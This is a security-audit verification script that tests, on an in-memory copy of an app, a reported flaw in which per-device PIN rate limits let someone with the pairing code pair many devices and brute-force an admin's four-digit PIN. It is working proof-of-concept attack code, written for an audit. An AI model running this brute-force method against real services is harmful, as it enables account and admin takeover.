// SEC skeptic #2 — independent verification of "pin-brute-via-multi-pairing".
// Fresh in-process real Worker (worker/src) on a fresh in-memory D1. Does NOT reuse the investigator's script.
// Run:  node "audits/tools/phase2/SEC/verify-pin-brute-via-multi-pairing-2.mjs"
//
// Questions this answers, as a skeptic trying to REFUTE:
//  A. Does /api/pair really succeed without limit from ONE IP (does success reset the pair counter)?
//  B. Is the wrong-PIN limit really per (profile, device) — 5 then 429 — and independent between devices?
//  C. The claimed scaled attack: N devices from one IP -> 5*N verify attempts / 15 min against one profile.
//  D. Control: does "holding a paired device" ALONE (no pairing code) scale? (Expected: no — 1 device = 5/15min,
//     and you cannot pair a new device without the code.)
//  E. End-to-end: with the correct PIN hidden among the guesses, is a real admin session actually issued?
process.env.TZ = 'America/New_York';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(HERE, '..', '..', '..', '..');
const OUT = path.join(ROOT, 'audits/evidence/p2/SEC');
globalThis.fetch = async u => { throw new Error('outbound fetch refused: ' + (u && (u.url || u))); };
globalThis.caches = { default: { async match() {}, async put() {} } };

const worker = (await import(pathToFileURL(path.join(ROOT, 'worker/src/index.js')).href)).default;
const { createD1 } = await import(pathToFileURL(path.join(ROOT, 'audits/tools/lib/d1.mjs')).href);
const { seedDemo } = await import(pathToFileURL(path.join(ROOT, 'audits/tools/seed.mjs')).href);
const { hashSecret } = await import(pathToFileURL(path.join(ROOT, 'worker/src/auth.js')).href);

async function fresh() {
  const DB = createD1(':memory:');
  await seedDemo(DB, { variant: 'empty', now: Date.now() });
  const env = { DB, ALLOWED_ORIGINS: 'http://localhost:8765' };
  const ctx = { waitUntil() {}, passThroughOnException() {} };
  const call = async (p, { method = 'GET', body, dt, pt, ip } = {}) => {
    const h = { 'Content-Type': 'application/json' };
    if (dt) h['X-Device-Token'] = dt; if (pt) h['X-Profile-Token'] = pt; if (ip) h['CF-Connecting-IP'] = ip;
    const r = await worker.fetch(new Request('http://api.local' + p, { method, headers: h, body: body === undefined ? undefined : JSON.stringify(body) }), env, ctx);
    const t = await r.text(); let j; try { j = JSON.parse(t); } catch { j = t; }
    return { status: r.status, error: j && j.error, body: j };
  };
  const CODE = 'skeptic-throwaway-code';
  DB.sqlite.prepare("UPDATE settings SET value = ? WHERE key = 'pairing_code_hash'").run(await hashSecret(CODE));
  const setPin = async (id, pin) => DB.sqlite.prepare('UPDATE profiles SET pin_hash = ? WHERE id = ?').run(await hashSecret(String(pin)), id);
  const pair = async (name, ip) => (await call('/api/pair', { method: 'POST', body: { code: CODE, name }, ip })).body.device_token;
  const rlRows = () => DB.sqlite.prepare('SELECT key, count FROM rate_limits ORDER BY key').all();
  return { DB, call, CODE, setPin, pair, rlRows };
}

const out = { baseline_commit: 'fe6041d (working tree)' };

// ── A. /api/pair succeeds unlimited from one IP ─────────────────────────────
{
  const { call, CODE } = await fresh();
  const IP = '203.0.113.77';
  const results = [];
  for (let i = 0; i < 25; i++) {
    const r = await call('/api/pair', { method: 'POST', body: { code: CODE, name: 'pair-' + i }, ip: IP });
    results.push(r.status);
  }
  out.A_pair_unlimited_one_ip = {
    ip: IP, attempts: results.length,
    all_200: results.every(s => s === 200),
    any_429: results.some(s => s === 429),
    distinct_statuses: [...new Set(results)],
    conclusion: 'correct pairing code -> rateClear() wipes the pair:<ip> counter every time, so success is never throttled',
  };
}

// ── B. wrong-PIN limit is per (profile, device): 5 then 429, independent between devices ──
{
  const { call, setPin, pair } = await fresh();
  await setPin('christian', '4242');
  const IP = '203.0.113.77';
  const dA = await pair('devA', IP), dB = await pair('devB', IP);
  const seq = dt => { const s = []; for (let i = 0; i < 7; i++) s.push(1); return s; };
  const runSeq = async dt => { const s = []; for (let i = 0; i < 7; i++) { const r = await call('/api/login', { method: 'POST', body: { profile_id: 'christian', pin: '0000' }, dt }); s.push({ status: r.status, error: r.error }); } return s; };
  const seqA = await runSeq(dA);
  // device B is a DIFFERENT device: its counter must be untouched by device A being locked
  const seqB = await runSeq(dB);
  out.B_per_device_limit = {
    devA_verify_before_lock: seqA.filter(x => x.error === 'wrong_pin').length,
    devA_first_429_at: seqA.findIndex(x => x.status === 429) + 1,
    devB_verify_before_lock: seqB.filter(x => x.error === 'wrong_pin').length,
    devB_first_429_at: seqB.findIndex(x => x.status === 429) + 1,
    conclusion: 'each device gets its own login:<profile>:<device> budget of 5; locking devA does not touch devB',
  };
}

// ── C. scaled attack: N devices from one IP -> 5*N attempts reaching verify / 15 min ──
{
  const { call, setPin, pair, rlRows } = await fresh();
  await setPin('christian', '9137');   // hidden from the "attacker" logic below
  const IP = '203.0.113.77';
  const N = 40; let paired = 0, reachedVerify = 0, blocked = 0;
  for (let n = 0; n < N; n++) {
    const dt = await pair('brute-' + n, IP); if (!dt) break; paired++;
    for (let g = 0; g < 6; g++) {   // try 6 per device: expect 5 to hit verify, the 6th to 429
      const r = await call('/api/login', { method: 'POST', body: { profile_id: 'christian', pin: String(2000 + n * 6 + g) }, dt });
      if (r.status === 429) blocked++; else reachedVerify++;
    }
  }
  out.C_scaled = {
    devices_paired_one_ip: paired,
    guesses_reaching_verify: reachedVerify,
    guesses_blocked_429: blocked,
    verify_per_device: paired ? reachedVerify / paired : 0,
    login_rate_rows: rlRows().length,   // one login:<profile>:<device> row per device = confirms per-device keying
    conclusion: `${paired} devices from one IP yielded ${reachedVerify} guesses that reached PIN verification in one 15-min window`,
  };
  out.C_time_to_exhaust_4digit = {
    space: 10000, expected_guesses: 5000, per_device_per_15min: 5,
    devices_for_whole_space_in_15min: Math.ceil(10000 / 5),
    devices_for_expected_in_15min: Math.ceil(5000 / 5),
    minutes_with_100_devices_expected: Math.ceil(5000 / (5 * 100)) * 15,
  };
}

// ── D. CONTROL (skeptic): one device alone, and can you pair without the code? ──
{
  const { call, setPin, pair } = await fresh();
  await setPin('christian', '4242');
  const IP = '203.0.113.77';
  const dt = await pair('lone', IP);
  let verify = 0; for (let i = 0; i < 20; i++) { const r = await call('/api/login', { method: 'POST', body: { profile_id: 'christian', pin: '0000' }, dt }); if (r.status !== 429) verify++; }
  // try to pair WITHOUT the pairing code (attacker who only holds a paired device, not the code)
  const noCode = await call('/api/pair', { method: 'POST', body: { code: 'not-the-code', name: 'x' }, ip: IP });
  out.D_control = {
    one_device_verify_in_15min: verify,
    pair_without_code_status: noCode.status, pair_without_code_error: noCode.error,
    conclusion: 'A single paired device alone gives only 5 guesses / 15 min; scaling REQUIRES the pairing code (pairing without it is 401). So the "holding a paired device" phrasing overstates the no-code case; the real precondition is the pairing code.',
  };
}

// ── E. end-to-end: correct PIN hidden among the guesses -> real admin session issued ──
{
  const { call, setPin, pair } = await fresh();
  const SECRET = '3081';
  await setPin('eli', SECRET);   // eli is the admin
  const IP = '203.0.113.77';
  // simulate a search that happens to include the correct value on the 3rd device, 2nd guess
  let session = null, adminOk = null, foundOnDevice = null;
  outer: for (let n = 0; n < 5; n++) {
    const dt = await pair('search-' + n, IP);
    const guesses = n === 2 ? ['1111', SECRET, '2222'] : ['1111', '2222', '3333', '4444', '5555'];
    for (const g of guesses) {
      const r = await call('/api/login', { method: 'POST', body: { profile_id: 'eli', pin: g }, dt });
      if (r.status === 200 && r.body && r.body.profile_token) {
        session = r.body.profile_token; foundOnDevice = n;
        const me = await call('/api/me', { dt, pt: session });
        adminOk = !!(me.body && me.body.profile && me.body.profile.is_admin);
        // confirm the session can actually drive an admin-only route
        const usage = await call('/api/admin/usage', { dt, pt: session });
        out.E_admin_route_status = usage.status;
        break outer;
      }
    }
  }
  out.E_end_to_end = {
    cracked_admin_pin: !!session, found_on_device_index: foundOnDevice,
    me_is_admin: adminOk,
    admin_route_reachable: out.E_admin_route_status === 200,
    conclusion: 'a guess that matches issues a valid profile_token; /api/me confirms is_admin and an admin-only route returns 200 -> full admin takeover',
  };
}

console.log(JSON.stringify(out, null, 1));
fs.mkdirSync(OUT, { recursive: true });
fs.writeFileSync(path.join(OUT, 'verify-pin-brute-2.json'), JSON.stringify(out, null, 1));
